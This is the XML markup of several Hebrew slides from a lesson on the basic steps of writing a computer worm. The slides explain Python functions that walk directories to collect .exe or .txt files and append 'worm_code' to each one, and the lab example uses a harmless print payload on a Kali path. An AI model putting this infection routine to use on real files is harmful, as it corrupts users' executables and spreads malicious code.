        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="293842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90CD825-17C4-4922-96B5-5F54B619C2AB}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1490870" y="642594"/>
            <a:ext cx="9634330" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - שלבים בסיסיים ביצירת תולעת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{01FF6F65-8C99-4D4E-A307-62E63A96B77B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הסבר: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>הספריה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>import </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נותנת אפשרות לעבוד עם מערכת ההפעלה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>find_files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> עוברת דרך כל הקבצים והספריות בתוך נתיב התחלתי ומחפשת קבצים עם סיומת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> (או כל סיומת אחרת שתרצה). היא מחזירה רשימה של כל הקבצים המתאימים. בגדול הפונקציה הזו תחפש קבצים הניתנים להדבקה</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>infect </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> באותו נתיב.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> = []</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : הרשימה הזו תשמור את כל הנתיבים של הקבצים שמצאנו ושברצוננו להדביק.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirnames</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, filenames in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.walk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>start_path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הפקודה הזו היא לולאה שמשתמשת בפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.walk</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הפונקציה הזו עוברת על כל הספריות והתיקיות שמתחילות מהנתיב ההתחלתי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>start_path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומחזירה שלושה דברים: </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הנתיב של הספרייה הנוכחית.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2.</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> :</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirnames</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>רשימה של כל הספריות שנמצאות בתוך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>3. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>filenames</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: רשימה של כל הקבצים שנמצאים בתוך </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>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8712253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588677F-6CB8-4ED8-8ED6-B689A38558E5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520686" y="642594"/>
            <a:ext cx="9604513" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - שלבים בסיסיים ביצירת תולעת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8684B496-E0CD-4BE2-AD0C-D87826F26864}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך הסבר:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>: for file in filenames:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בתוך כל ספרייה שהלולאה הקודמת מצאה, הלולאה הזו עוברת על כל הקבצים שמופיעים ברשימת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>filenames</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> if </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>file.endswith</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(".exe"):</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : כאן אנחנו בודקים אם השם של כל קובץ מסתיים ב-".</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> “exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>כלומר אם מדובר בקובץ הרצה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Executable file</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>במקרה הזה, אנחנו מחפשים קבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> EXE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אבל אפשר לחפש כל סיומת אחרת, כמו .</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> txt, .docx </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>וכו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>'.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect.append</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.path.join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, file))</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: אם הקובץ הוא קובץ </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>EXE, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>אנחנו יוצרים את הנתיב המלא של הקובץ באמצעות </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>os.path.join</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>dirpath</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, file)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ומוסיפים אותו לרשימת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> return </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: בסוף הפונקציה, אנחנו מחזירים את הרשימה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שכוללת את כל הנתיבים של קבצי ה-</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> EXE </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>שמצאנו.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="14720302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1B56708-83C6-4626-BD5D-994D1FA4E18B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1480930" y="642594"/>
            <a:ext cx="9644270" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - שלבים בסיסיים ביצירת תולעת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FF139FB7-3F42-4A70-BEE9-63A581BD9EF9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>עכשיו, לאחר שמיפינו את כל </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>קבצע</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> ה- </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.EXE</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> נרצה לעבוד עליהם עם התולעת:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>נתון הקוד הבא:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>infect_files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>):</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>    for file in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>        with open(file, "a") as f:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>            </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>f.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3932355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881B76E-805E-4F01-BDE6-2D9B5665A9DD}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1520686" y="642594"/>
            <a:ext cx="9604513" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>המשך - שלבים בסיסיים ביצירת תולעת</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BABFBD27-E645-4163-926D-BF9772892D9A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>def </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>infect_files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>, </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הפקודה הזו מגדירה פונקציה בשם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>infect_files</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> שמקבלת שני פרמטרים:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>1. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: רשימה של קבצים שאותם אנחנו רוצים להדביק. הרשימה הזו יכולה להיות התוצאה של הפונקציה </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>find_files_to_infect</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>2. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> : זהו הקוד הזדוני (התולעת) שנרצה להוסיף לכל אחד מהקבצים שנמצאים ברשימה.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>for file in </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הפקודה הזו יוצרת לולאה שעוברת על כל קובץ שנמצא ברשימת </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>files_to_infect</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>with open(file, "a") as f</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: כאן אנחנו פותחים כל קובץ בלולאה במצב של </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>append</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> הוספה. מצב </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>“a”</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> מאפשר לנו לפתוח את הקובץ ולהוסיף תוכן חדש בסופו, מבלי למחוק את התוכן הקיים. </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>as f</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אומר שאנחנו קוראים לקובץ שנפתח בשם </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>f</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בתוך הבלוק הזה, כדי שנוכל לעבוד </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0" err="1"/>
              <a:t>איתו</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בצורה פשוטה יותר.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>f.write</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>: הפקודה הזו כותבת את הקוד הזדוני </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> בסופו של הקובץ שנפתח. זה למעשה הפעולה שמבצעת את ההדבקה של הקובץ בקוד התולעת.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
          <a:p>
            <a:endParaRPr lang="he-IL" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3356534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7A57708-22E8-44E4-916E-435892AA8DFC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="437322" y="642594"/>
            <a:ext cx="11330607" cy="1371600"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" sz="4000" dirty="0"/>
              <a:t>המשך – שלבים בסיסיים ליצירת תולעת (הלכה למעשה)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="מציין מיקום תוכן 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5F451ED2-313F-4B5C-BCB6-5170A2470BED}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1066800" y="2103120"/>
            <a:ext cx="10058400" cy="4436828"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr>
            <a:normAutofit fontScale="62500" lnSpcReduction="20000"/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>לקחנו את אותו הקוד שבנינו מקודם רק שנשנה במקום שנחפש קבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.exe</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> אנו נחפש קבצי </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>.txt</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t> את הקוד הנ"ל אנו נקודד בלינוקס ע"י הפקודה הבאה:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="he-IL" dirty="0"/>
              <a:t>ונוסיף לו :</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="he-IL" sz="3200" dirty="0"/>
              <a:t>קוד התולעת שיתווסף לקבצים</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>worm_code</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t> = "\n# This is a worm!\</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>nprint</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t>('You have been infected!')\n"</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:endParaRPr lang="en-US" sz="3200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t># </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="he-IL" sz="3200" dirty="0"/>
              <a:t>חיפוש קבצים להדבקה</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr algn="l"/>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0" err="1"/>
              <a:t>start_path</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="3200" dirty="0"/>
              <a:t> = "/home/kali/Documents"</a:t>
            </a:r>
            <a:endParaRPr lang="he-IL" sz="3200" dirty="0"/>
          </a:p>
